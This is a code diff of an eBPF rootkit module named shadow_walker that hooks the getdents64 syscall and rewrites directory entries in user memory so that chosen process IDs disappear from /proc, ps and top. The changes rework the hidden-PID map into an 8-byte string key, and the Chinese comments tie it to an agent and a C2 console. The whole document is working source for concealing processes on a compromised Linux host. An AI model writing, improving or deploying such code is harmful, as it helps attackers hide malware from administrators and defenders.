@@ -1,3 +1,4 @@
+// shadow_walker.bpf.c
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -8,27 +9,24 @@ char LICENSE[] SEC("license") = "GPL";
 char _metadata[] __attribute__((used, section(".metadata"))) =
     "{"
       "\"name\":\"shadow_walker\","
-      "\"desc\":\"进程隐藏：Hook getdents64 系统调用，使目标 PID 从 /proc 及 ps/top 消失\","
+      "\"desc\":\"Process Hiding: Hooks getdents64 syscall to make target PIDs vanish from /proc and ps/top.\","
       "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
-      "\"options\":{},"
+      "\"options\":{"
+        "\"target\":[\"0\",\"Target PID to hide immediately upon loading\"]"
+      "},"
       "\"maps\":{"
-        "\"hidden_pids\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
+        // 与你的 agent.c 和 console.py 完美对应：8 字节的字符串 Key！
+        "\"target\":{\"key_size\":8,\"value_size\":4,\"key_type\":\"u64\",\"value_type\":\"u32\"}"
       "}"
     "}";
 
-/*
- * 要隐藏的 PID 集合（hash map）
- * 可在模块加载后通过 CMD_UPDATE 动态增删
- * update 格式：config[0:4]=PID(u32 LE), config[4:8]=1(u32 LE)
- */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 64);
-    __type(key, u32);
+    __type(key, u64); // 8 字节字符串
     __type(value, u32);
-} hidden_pids SEC(".maps");
+} target SEC(".maps");
 
-/* 记录 getdents64 调用上下文 */
 struct getdents_ctx {
     void *dirp;
     int   fd;
@@ -39,16 +37,6 @@ struct {
     __type(key, u64);
     __type(value, struct getdents_ctx);
 } active_getdents SEC(".maps");
-
-/* 字符串 → 整数（仅处理纯数字串） */
-static __always_inline int str_to_int(const char *s, int len) {
-    int result = 0;
-    for (int i = 0; i < len && i < 8; i++) {
-        if (s[i] < '0' || s[i] > '9') return -1;
-        result = result * 10 + (s[i] - '0');
-    }
-    return result;
-}
 
 SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
@@ -76,8 +64,8 @@ int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
     int  prev_offset = -1;
     unsigned short prev_reclen = 0;
 
-    #pragma unroll
-    for (int i = 0; i < 128; i++) {
+    #pragma clang loop unroll(disable)
+    for (int i = 0; i < 256; i++) {
         if (offset >= total) break;
 
         unsigned short d_reclen = 0;
@@ -85,34 +73,32 @@ int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
             dirp + offset + offsetof(struct linux_dirent64, d_reclen));
         if (err != 0 || d_reclen == 0) break;
 
-        char d_name[16] = {};
+        // 降维打击的核心：直接把目录名当成 8 字节内存块读出来
+        char d_name[8] = {}; 
+        
+        // 2. 读取字符串。它遇到 \0 就会自动停止！剩下的字节完美保持为 0！
         bpf_probe_read_user_str(d_name, sizeof(d_name),
             dirp + offset + offsetof(struct linux_dirent64, d_name));
 
-        int name_len = 0;
-        for (int j = 0; j < 15; j++) {
-            if (d_name[j] == '\0') break;
-            name_len++;
-        }
+        // 3. 把这块洗干净的、带 \0 填充的内存，直接强制转换为 u64
+        u64 raw_name_str = *(u64 *)d_name;
 
-        if (name_len > 0 && name_len < 8) {
-            int pid = str_to_int(d_name, name_len);
-            if (pid > 0) {
-                u32 pid_key = (u32)pid;
-                if (bpf_map_lookup_elem(&hidden_pids, &pid_key)) {
-                    if (prev_offset >= 0) {
-                        unsigned short new_reclen = prev_reclen + d_reclen;
-                        bpf_probe_write_user(
-                            dirp + prev_offset + offsetof(struct linux_dirent64, d_reclen),
-                            &new_reclen, sizeof(new_reclen));
-                        bpf_printk("SHADOW_WALKER: PID %d hidden\n", pid);
-                        prev_reclen = new_reclen;
-                        offset += d_reclen;
-                        continue;
-                    }
-                }
+        // 此时，raw_name_str 里的内容就是 "58795\0\0\0"
+        // 你的 C2 写入 Map 的也是 "58795\0\0\0"
+        // 它们会在这里完美邂逅！
+        if (bpf_map_lookup_elem(&target, &raw_name_str)) {
+            if (prev_offset >= 0) {
+                unsigned short new_reclen = prev_reclen + d_reclen;
+                bpf_probe_write_user(
+                    dirp + prev_offset + offsetof(struct linux_dirent64, d_reclen),
+                    &new_reclen, sizeof(new_reclen));
+                
+                prev_reclen = new_reclen;
+                offset += d_reclen;
+                continue;
             }
         }
+
         prev_offset = offset;
         prev_reclen = d_reclen;
         offset += d_reclen;
